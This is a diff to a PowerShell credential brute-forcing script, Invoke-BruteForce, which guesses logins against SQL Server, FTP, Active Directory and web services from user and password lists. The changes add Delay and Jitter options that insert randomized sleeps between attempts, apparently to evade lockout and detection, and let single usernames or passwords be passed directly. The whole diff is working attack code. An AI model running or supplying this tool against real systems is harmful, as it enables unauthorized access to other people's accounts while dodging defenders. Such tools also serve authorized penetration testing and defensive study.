@@ -23,6 +23,14 @@ Enter a Service from SQL, ActiveDirecotry, FTP and Web. Default service is set t
 .PARAMETER StopOnSuccess
 Use this switch to stop the brute forcing on the first success.
 
+.PARAMETER Delay
+Delay between brute-force attempts, defaults to 0.
+(Shamelessly stolen from https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView)
+
+.PARAMETER Jitter
+Jitter for the brute-force attempt delay, defaults to +/- 0.3 
+(Shamelessly stolen from https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView)
+
 .EXAMPLE
 PS > Invoke-BruteForce -ComputerName SQLServ01 -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose
 Brute force a SQL Server SQLServ01 for users listed in users.txt and passwords in wordlist.txt
@@ -50,27 +58,50 @@ Goude 2012, TreuSec
         [String]
         $ComputerName,
 
-        [Parameter(Position = 1, Mandatory = $false)]
+        [Parameter(Position = 1, Mandatory = $true)]
+        [Alias('Users')]
         [String]
         $UserList,
 
-        [Parameter(Position = 2, Mandatory = $false)]
+        [Parameter(Position = 2, Mandatory = $true)]
+        [Alias('Passwords')]
         [String]
         $PasswordList,
 
-        [Parameter(Position = 3, Mandatory = $false)] [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
+        [Parameter(Position = 3, Mandatory = $true)] [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
         [String]
         $Service = "SQL",
 
         [Parameter(Position = 4, Mandatory = $false)]
         [Switch]
-        $StopOnSuccess
+        $StopOnSuccess,
+        
+        [Parameter(Position = 5, Mandatory = $false)]
+        [Double]
+        $Jitter = .3,
+
+        [Parameter(Position = 6, Mandatory = $false)]
+        [UInt32]
+        $Delay = 0
     )
 
     Process
     {
-        $usernames = Get-Content $UserList
-        $passwords = Get-Content $PasswordList
+        $usernames = Get-Content -ErrorAction SilentlyContinue -Path $UserList
+        $passwords = Get-Content -ErrorAction SilentlyContinue -Path $PasswordList
+        if (!$usernames) { 
+            $usernames = $UserList
+            Write-Verbose "UserList file does not exist. Using UserList as usernames:"
+            Write-Verbose $usernames
+        }
+        if (!$passwords) {
+            $passwords = $PasswordList
+            Write-Verbose "PasswordList file does not exist. Using PasswordList as passwords:"
+            Write-Verbose $passwords
+        }
+
+        $RandNo = New-Object System.Random
+
         #Brute force SQL Server
         $Connection = New-Object System.Data.SQLClient.SQLConnection
         function CheckForSQLSuccess
@@ -100,6 +131,9 @@ Goude 2012, TreuSec
                     Default { "Unknown" }
                 }
             }
+
+            # Shamelessly stolen from https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
+            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
         }
         if($service -eq "SQL")
         {
@@ -163,6 +197,9 @@ Goude 2012, TreuSec
                         $message = $error[0].ToString()
                         $success = $false
                     }
+
+                    # Shamelessly stolen from https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
+                    Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                 }
             }
         }
@@ -187,16 +224,17 @@ Goude 2012, TreuSec
             {
                 :UsernameLoop foreach ($username in $usernames)
                 {
-                    foreach ($Password in $Passwords)
+                    foreach ($password in $passwords)
                     {
+                        $SleepSeconds = $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                         Try
                         {
-                            Write-Verbose "Checking $userName : $password"
+                            Write-Verbose "Checking $username : $password (then sleeping for $SleepSeconds seconds)"
                             $success = $principalContext.ValidateCredentials($username, $password)
                             $message = "Password Match"
                             if ($success -eq $true)
                             {
-                                Write-Output "Match found! $username : $Password"
+                                Write-Output "Match found! $username : $password"
                                 if ($StopOnSuccess)
                                 {
                                     break UsernameLoop
@@ -208,8 +246,14 @@ Goude 2012, TreuSec
                             $success = $false
                             $message = "Password doesn't match"
                         }
+
+                        # Shamelessly stolen from https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
+                        Start-Sleep -Seconds $SleepSeconds
                     }
                 }
+            }
+            else {
+            Write $message    
             }
         }
         #Brute Force Web
@@ -252,6 +296,8 @@ Goude 2012, TreuSec
                         $success = $false
                         $message = "Password doesn't match"
                     }
+                    # Shamelessly stolen from https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
+                    Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                 }
             }
         }
